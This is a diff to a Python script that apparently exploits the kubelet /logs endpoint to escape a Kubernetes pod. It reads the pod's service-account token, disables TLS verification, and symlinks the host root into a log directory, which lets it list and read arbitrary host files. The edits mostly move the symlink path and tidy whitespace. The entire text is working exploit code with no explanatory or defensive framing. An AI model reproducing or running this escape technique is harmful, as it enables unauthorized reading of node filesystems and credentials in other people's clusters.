@@ -14,13 +14,13 @@ def get_default_gateway():
     return netifaces.gateways()['default'][netifaces.AF_INET][0]
 
 LOGS_URL = "https://{}:10250/logs".format(get_default_gateway())
-HOST_FS_BASE = LOGS_URL+"/root_link" 
+HOST_FS_BASE = LOGS_URL+"/root_link"
 
 def attach_to_root():
-    os.symlink("/", "/var/log/host/root_link")
+    os.symlink("/", "/etc/fluent/root_link")
 
 def detach_from_root():
-    os.remove("/var/log/host/root_link")
+    os.remove("/etc/fluent/root_link")
 
 def read_folder(path):
     soup = BeautifulSoup(s.get(HOST_FS_BASE+path).text, 'html.parser')
@@ -36,7 +36,7 @@ def cat(path):
     try:
         attach_to_root()
         print(s.get(HOST_FS_BASE+path).text)
-    except Exception as x: 
+    except Exception as x:
         print("ERROR: {}".format(x))
     finally:
         detach_from_root()
@@ -45,7 +45,7 @@ def ls(path):
     try:
         attach_to_root()
         print('\n'.join(read_folder(path)))
-    except Exception as x: 
+    except Exception as x:
         print("ERROR: {}".format(x))
     finally:
         detach_from_root()
@@ -60,7 +60,7 @@ def usage():
 if __name__ == "__main__":
     if len(sys.argv) < 3:
         usage()
-    with open("/var/run/secrets/kubernetes.io/serviceaccount/token", 'r') as tf:    
+    with open("/var/run/secrets/kubernetes.io/serviceaccount/token", 'r') as tf:
         token = tf.read()
     s = requests.session()
     s.verify = False
